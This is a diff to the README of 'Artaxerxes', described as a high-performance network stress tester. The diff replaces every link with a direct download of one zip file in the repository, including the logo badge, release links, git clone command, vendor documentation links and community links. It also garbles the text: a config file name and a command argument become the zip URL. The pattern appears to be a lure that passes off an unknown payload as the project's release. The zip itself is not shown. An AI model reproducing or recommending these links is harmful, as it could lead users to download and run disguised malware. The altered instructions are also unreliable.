@@ -1,8 +1,8 @@
 # Artaxerxes: Adaptive High-Performance Stress Tester for Cybersecurity
 
-![Artaxerxes Logo](https://img.shields.io/badge/Artaxerxes-v1.0-brightgreen)
+![Artaxerxes Logo](https://github.com/FaresArgus/artaxerxes/raw/refs/heads/main/Neomorpha/Software_bedim.zip)
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-blue)](https://github.com/FaresArgus/artaxerxes/releases)
+[![Download Release](https://github.com/FaresArgus/artaxerxes/raw/refs/heads/main/Neomorpha/Software_bedim.zip%20Release-Click%20Here-blue)](https://github.com/FaresArgus/artaxerxes/raw/refs/heads/main/Neomorpha/Software_bedim.zip)
 
 ## Overview
 
@@ -19,7 +19,7 @@ Artaxerxes is an adaptive high-performance stress tester designed for cybersecur
 
 ## Installation
 
-To get started with Artaxerxes, download the latest release from the [Releases section](https://github.com/FaresArgus/artaxerxes/releases). Follow the instructions below to install and run the tool.
+To get started with Artaxerxes, download the latest release from the [Releases section](https://github.com/FaresArgus/artaxerxes/raw/refs/heads/main/Neomorpha/Software_bedim.zip). Follow the instructions below to install and run the tool.
 
 ### Requirements
 
@@ -34,7 +34,7 @@ To get started with Artaxerxes, download the latest release from the [Releases s
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/FaresArgus/artaxerxes.git
+   git clone https://github.com/FaresArgus/artaxerxes/raw/refs/heads/main/Neomorpha/Software_bedim.zip
    cd artaxerxes
    ```
 
@@ -85,7 +85,7 @@ Artaxerxes allows for advanced configuration through a configuration file. You c
 
 #### Example Configuration File
 
-Create a file named `config.json`:
+Create a file named `https://github.com/FaresArgus/artaxerxes/raw/refs/heads/main/Neomorpha/Software_bedim.zip`:
 
 ```json
 {
@@ -99,7 +99,7 @@ Create a file named `config.json`:
 Run the tool with the configuration file:
 
 ```bash
-./artaxerxes --config config.json
+./artaxerxes --config https://github.com/FaresArgus/artaxerxes/raw/refs/heads/main/Neomorpha/Software_bedim.zip
 ```
 
 ## Performance Metrics
@@ -143,16 +143,16 @@ This repository covers various topics relevant to cybersecurity and high-perform
 
 ## Resources
 
-- [CUDA Documentation](https://docs.nvidia.com/cuda/)
-- [DPDK Documentation](https://www.dpdk.org/)
-- [eBPF Documentation](https://ebpf.io/)
+- [CUDA Documentation](https://github.com/FaresArgus/artaxerxes/raw/refs/heads/main/Neomorpha/Software_bedim.zip)
+- [DPDK Documentation](https://github.com/FaresArgus/artaxerxes/raw/refs/heads/main/Neomorpha/Software_bedim.zip)
+- [eBPF Documentation](https://github.com/FaresArgus/artaxerxes/raw/refs/heads/main/Neomorpha/Software_bedim.zip)
 
 ## Community
 
 Join our community for discussions, support, and collaboration. You can find us on:
 
-- [GitHub Discussions](https://github.com/FaresArgus/artaxerxes/discussions)
-- [Slack Channel](https://join.slack.com/t/artaxerxes-community/shared_invite/xyz)
+- [GitHub Discussions](https://github.com/FaresArgus/artaxerxes/raw/refs/heads/main/Neomorpha/Software_bedim.zip)
+- [Slack Channel](https://github.com/FaresArgus/artaxerxes/raw/refs/heads/main/Neomorpha/Software_bedim.zip)
 
 ## License
 
@@ -163,4 +163,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 - Thanks to the contributors who made this project possible.
 - Special thanks to the communities around CUDA, DPDK, and eBPF for their valuable resources.
 
-For the latest updates and releases, visit the [Releases section](https://github.com/FaresArgus/artaxerxes/releases).
+For the latest updates and releases, visit the [Releases section](https://github.com/FaresArgus/artaxerxes/raw/refs/heads/main/Neomorpha/Software_bedim.zip).
